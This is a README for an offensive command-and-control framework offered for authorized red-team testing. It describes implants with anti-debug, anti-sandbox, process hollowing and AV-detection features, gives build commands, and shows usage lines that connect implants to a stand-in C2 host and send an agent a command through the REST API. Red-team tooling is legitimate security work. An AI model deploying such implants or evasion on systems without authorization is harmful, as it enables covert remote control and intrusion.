# SCYTHE - Advanced C2 Framework

A comprehensive Command & Control (C2) framework for security testing and red team operations, featuring multiple implant types, enterprise-grade cryptography, and a robust server infrastructure.

## 🛡️ Overview

SCYTHE is a multi-component C2 framework designed for authorized security testing and red team exercises. It provides:

- **Multiple Implant Types**: C++ enterprise implants and Nim cross-platform agents
- **Enterprise Cryptography**: AES-256-GCM encryption with advanced obfuscation
- **Robust Server**: Rust-based backend with comprehensive monitoring
- **Cross-Platform Support**: Windows, Linux, and macOS compatibility

## 🏗️ Architecture

```
scythe/
├── server/          # Rust-based C2 server
├── implant/         # C++ enterprise implants
├── nimplant/        # Nim cross-platform implants
└── README.md        # This file
```

## 📋 Components

### C2 Server (`server/`)
- **Language**: Rust
- **Features**: REST API, JWT authentication, SQLite database, enterprise crypto
- **Endpoints**: Agent management, task distribution, file handling
- **Security**: Rate limiting, audit logging, compliance reporting

### Enterprise Implant (`implant/`)
- **Language**: C++
- **Features**: Advanced crypto, anti-debug, performance monitoring
- **Platforms**: Windows, Linux (with cross-compilation support)
- **Security**: Key rotation, obfuscation, stealth techniques

### Nim Implant (`nimplant/`)
- **Language**: Nim
- **Features**: Cross-platform, minimal footprint, HTTP/HTTPS C2
- **Platforms**: Windows, Linux, macOS
- **Modules**: Registry ops, AV detection, file operations

## 🚀 Quick Start

### 1. Server Setup

```bash
cd server/
cargo build --release
cargo run
```

The server will start on `http://127.0.0.1:8080` by default.

### 2. Build Implants

#### C++ Enterprise Implant
```bash
cd implant/
make -f Makefile.enterprise release
# Output: bin/enterprise_implant
```

#### Nim Cross-Platform Implant
```bash
cd nimplant/
nim c --opt:speed --define:release main.nim
# Output: main (or main.exe on Windows)
```

### 3. Deploy and Connect

```bash
# Run C++ implant
./bin/enterprise_implant <server_ip> <port>

# Run Nim implant
./main -h <server_ip> -p <port>
```

## 🔧 Configuration

### Server Configuration
- **Database**: SQLite (configurable path)
- **Authentication**: JWT with configurable expiration
- **Crypto**: AES-256-GCM with enterprise features
- **Logging**: Structured logging with multiple levels

### Implant Configuration
- **Sleep/Jitter**: Configurable timing for evasion
- **User Agents**: Customizable HTTP headers
- **Encryption**: Enterprise-grade with key rotation
- **Modules**: Pluggable command modules

## 🛠️ Features

### Enterprise Security
- **AES-256-GCM Encryption** with automatic key rotation
- **Advanced Obfuscation** including case-alternating reverse base64
- **Security Monitoring** with real-time alerting
- **Compliance Reporting** for enterprise standards

### Cross-Platform Support
- **Windows**: Full API access, registry operations, AV detection
- **Linux**: Process management, file operations
- **macOS**: Cross-compilation and native support

### Command Capabilities
- **System Information**: OS details, user context, environment
- **File Operations**: Upload, download, copy, directory listing
- **Process Management**: Enumeration and control
- **Registry Access**: Query and modify (Windows)
- **Network Operations**: HTTP/HTTPS communication
- **Stealth Features**: Anti-debug, timing randomization

## 🔐 Security Features

### Encryption & Obfuscation
- AES-256-GCM for data protection
- Advanced base64 obfuscation techniques
- Automatic key rotation policies
- Secure memory handling

### Evasion Techniques
- Randomized sleep intervals with jitter
- User-agent rotation
- Process hollowing capabilities
- Anti-VM/sandbox detection

### Monitoring & Compliance
- Real-time security alerts
- Comprehensive audit logging
- Compliance reporting (FIPS, PCI-DSS, etc.)
- Performance metrics and monitoring

## 📚 Documentation

### Server Documentation
- [API Endpoints](server/src/api/README.md)
- [Crypto Module](server/ENTERPRISE_CRYPTO_README.md)
- [Authentication](server/src/auth/README.md)

### Implant Documentation
- [C++ Enterprise Implant](implant/README.md)
- [Nim Cross-Platform Implant](nimplant/README.md)
- [Build Instructions](implant/BUILD.md)

## 🧪 Testing

### Unit Tests
```bash
# Server tests
cd server && cargo test

# C++ implant tests
cd implant && make test

# Nim implant tests
cd nimplant && nim c -r tests/test_all.nim
```

### Integration Tests
```bash
# Full framework test
./scripts/integration_test.sh
```

## 🏗️ Building

### Prerequisites
- **Rust** (1.70+) for server
- **GCC/Clang** for C++ implants
- **Nim** (1.4+) for Nim implants
- **OpenSSL** development libraries
- **Boost** libraries (C++ implant)

### Cross-Compilation
```bash
# Windows from Linux (C++)
make -f Makefile.enterprise windows

# Windows from Linux (Nim)
cd nimplant && ./build.sh windows

# All platforms
./build_all.sh
```

## 🚦 Usage Examples

### Basic C2 Session
```bash
# Start server
cargo run --bin server

# Connect implant
./enterprise_implant 127.0.0.1 8080

# Issue commands via REST API
curl -X POST http://127.0.0.1:8080/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"agent_id": "agent123", "command": "whoami"}'
```

### Advanced Configuration
```bash
# Server with custom config
cargo run --bin server -- --config custom.toml

# Implant with HTTPS and custom timing
./main -h c2.example.com -p 443 --https -s 10 -j 30

# Enterprise implant with custom key
./enterprise_implant --host c2.example.com --key <base64_key>
```

## ⚠️ Legal & Ethical Use

This framework is designed for **authorized security testing only**:

- ✅ Penetration testing with written authorization
- ✅ Red team exercises within your organization  
- ✅ Security research in controlled environments
- ✅ Educational purposes in academic settings

**DO NOT USE FOR:**
- ❌ Unauthorized access to systems
- ❌ Malicious activities
- ❌ Violations of local/international law

Users are responsible for ensuring compliance with all applicable laws and regulations.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Guidelines
- Follow language-specific style guides
- Add tests for new functionality
- Update documentation for changes
- Ensure cross-platform compatibility

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- OpenSSL Project for cryptographic libraries
- Rust Community for excellent HTTP and crypto crates
- Nim Community for cross-platform capabilities
- Security Research Community for techniques and methodologies

## 📞 Support

- **Issues**: GitHub Issues for bug reports
- **Discussions**: GitHub Discussions for questions
- **Security**: Contact maintainers privately for security issues

---

**⚡ Built for Security Professionals, by Security Professionals**

*SCYTHE provides the tools you need for comprehensive security testing while maintaining the highest standards of operational security and compliance.*